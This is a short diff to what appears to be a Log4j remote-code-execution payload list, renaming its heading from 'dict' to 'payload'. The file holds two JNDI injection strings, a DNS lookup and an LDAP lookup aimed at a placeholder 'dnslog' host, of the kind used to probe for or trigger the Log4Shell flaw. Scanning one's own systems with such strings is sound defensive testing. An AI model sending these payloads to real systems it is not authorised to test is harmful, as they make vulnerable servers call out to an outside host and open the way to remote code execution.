@@ -1,4 +1,4 @@
-# Log4j RCE dict
+# Log4j RCE payload
 
 ${jndi:dns://dnslog}
 ${jndi:ldap://dnslog/test}
